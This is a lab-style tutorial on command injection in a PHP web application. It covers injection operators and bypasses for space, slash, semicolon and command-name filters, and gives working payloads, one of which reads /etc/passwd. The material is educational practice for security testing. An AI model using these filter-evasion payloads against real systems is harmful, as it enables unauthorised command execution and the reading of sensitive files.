# Labs

## Simplest Command Injection

### Target

<figure><img src="../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

### Functionality

The web application is creating a new file with the provided filename in the temp folder using the command => `system(“touch /tmp/”.$filename);`

<figure><img src="../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

### Exploitation

Thus, to exploit this type of vulnerability we can simply add \`;\` and add our second command which in background will execute something like this:

`touch /tmp/new.txt; id`

<figure><img src="../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

The user permissions will be those on behalf of which the PHP is executing commands. In our case it is r0b (normal user).

#### Vulnerable code

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

## Identifying filters (Simplest Filters)

### Target

<figure><img src="../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

### Functionality

<figure><img src="../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

### Exploitation

Thus we can see in the above image we’re not allowed to use `;` or `|` to add another command in the ip address section. Thus, let’s try some other using which we can execute commands from the command’s execution operator table in the prerequisite section.

<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

## Bypassing Space Filters

We’ve the same type of target and functionality as in the previous labs the only difference is in the source code behind the logic of the filter.

{% hint style="info" %}
**Note:** _The new-line character (‘\n’) is mostly bypassable in any OS. \[%0a (percent encode)]_
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

Spaces can be bypassed using:

* Tabs: `%09` => `%0a%09`
* IFS (Linux Specific): `${IFS}`
* Using brace expansion (Linux specific): `{ls,-la}`
* Using redirection: `<`
* Using ANSI C Quoting: `\x20`

<figure><img src="../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

This may or may not work in all Operating Systems. We’ve to use `/bin/sh -c <command>` to see if it works.

<figure><img src="../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

## Bypassing Blacklisted characters

Besides injection operators and space characters, a very commonly blacklisted character is the slash (/) or backslash () character, as it is necessary to specify directories in Linux or Windows.

### Target&#x20;

We’ve the same type of target and functionality as in the previous labs and the same lab is being used for this practical too. This time it is blacklisting the slash or backslash which prevents us from reading the internal sensitive files.

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

### Bypassing slash and semi-colon (Linux)

Bypassing `/` filter

* Using environment variable: `echo ${PATH:0:1}`
* Using character shifting: `echo $(tr '!-}' '"-~'<<<[)`\
  `\ is on 92, before it is [ on 91`\
  `search for this in man ascii`

Bypassing semicolon filters:

* Using environment variable: `echo ${LS_COLORS:10:1}`

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

### Bypassing slash and semi-colon (windows)

Bypassing `/` filter

* Using environment variable:
  * CMD: `echo %HOMEPATH:~0,1%`
  * PowerShell: `$env:HOMEPATH[0]`

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

### Exploitation

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

```
127.0.0.1%0a{ls,${PATH:0:1}var${PATH:0:1}${PATH:0:1}www,-la}
```

## Bypassing Blacklisted Commands

Nowadays the developers are smart and they directly blacklist the commands that are commonly used to check or perform remote code execution.

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

### Command Bypasses (Obfuscation Techniques)

1. **Using single and double quotes (Common in window and linux)**

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Note:** _The no. of quotes must be even._
{% endhint %}

2. **Using positional parameter character `$@` & `/`**

<figure><img src="../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

3. **Windows Only**

<figure><img src="../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

### Exploitation

<figure><img src="../../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

```
127.0.0.1%0a{c'a't,${PATH:0:1}etc${PATH:0:1}passwd}
```

### Other advanced technique

1.  **Case Manipulation**

    1. **Windows**

    <figure><img src="../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

    1. **Linux**

    <figure><img src="../../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>
2.  **Reversed Commands**

    1. **Linux**

    <figure><img src="../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

    1. **Windows**

    <figure><img src="../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>
3.  **Encoded Commands**

    1. **Linux**

    <figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

    1. **Windows**

    <figure><img src="../../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

## Automation

Are you tired of manually checking things go for automation. Boom 💣.

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

**Mutation Available:**&#x20;

<figure><img src="../../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

Use `--test` option to check with the operating system if it is executable. Always make sure that you save payload to a file and then execute it and copy the whole payload as it is to be on the safe side.

{% hint style="info" %}
**Note:** _Always use compression method to compress it._
{% endhint %}

For Windows command use Dosfuscation which is PowerShell implementation of this.
